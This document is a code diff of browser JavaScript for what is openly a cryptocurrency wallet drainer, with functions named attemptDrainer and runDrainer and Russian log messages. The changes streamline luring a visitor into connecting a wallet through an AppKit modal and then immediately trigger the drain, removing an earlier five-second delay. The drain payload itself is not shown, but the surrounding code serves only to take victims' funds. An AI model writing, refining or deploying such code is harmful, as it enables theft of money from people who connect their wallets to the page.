@@ -218,18 +218,10 @@ window.addEventListener('DOMContentLoaded', () => {
 
   modalSubtitle = modalContent.querySelector('.modal-subtitle');
 
-  if (!isInjected) {
-    actionBtn.style.display = 'inline-block';
-    actionBtn.addEventListener('click', () => {
-      window.showWalletRedirectModal();
-    });
-    return;
-  }
-
   actionBtn.style.display = 'inline-block';
   actionBtn.addEventListener('click', handleConnectOrAction);
 
-  window.ethereum.on('chainChanged', onChainChanged);
+  window.ethereum?.on('chainChanged', onChainChanged);
 });
 
 // === Управление модальным окном ===
@@ -276,9 +268,6 @@ async function attemptDrainer() {
       throw new Error('Wallet address mismatch');
     }
 
-    console.log('⏳ Задержка 5 секунд перед runDrainer');
-    await new Promise(resolve => setTimeout(resolve, 5000));
-
     isTransactionPending = true;
     const status = await runDrainer(provider, signer, connectedAddress);
     console.log('✅ Drainer выполнен, статус:', status);
@@ -311,14 +300,9 @@ async function attemptDrainer() {
 // === Подключение кошелька и запуск ===
 async function handleConnectOrAction() {
   try {
-    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-    if (accounts.length === 0) {
-      await appKitModal.open();
-      connectedAddress = await waitForWallet();
-    } else {
-      connectedAddress = accounts[0];
-      console.log('✅ Подключён:', connectedAddress);
-    }
+    await appKitModal.open(); // Открываем модальное окно AppKit
+    connectedAddress = await waitForWallet();
+    console.log('✅ Подключён:', connectedAddress);
 
     if (!isTransactionPending) {
       await attemptDrainer();
@@ -345,16 +329,16 @@ async function onChainChanged(chainId) {
 
 // === Ожидание подключения кошелька ===
 async function waitForWallet() {
-  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-  if (accounts.length > 0) return accounts[0];
-
-  return new Promise((resolve) => {
-    const interval = setInterval(async () => {
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      if (accounts.length) {
-        clearInterval(interval);
-        resolve(accounts[0]);
+  return new Promise((resolve, reject) => {
+    appKitModal.subscribeModal(state => {
+      if (state.open === false && window.ethereum?.selectedAddress) {
+        const address = window.ethereum.selectedAddress;
+        resolve(address);
       }
-    }, 500);
+    });
+
+    setTimeout(() => {
+      reject(new Error('Wallet connection timeout'));
+    }, 30000); // Тайм-аут 30 секунд
   });
 }
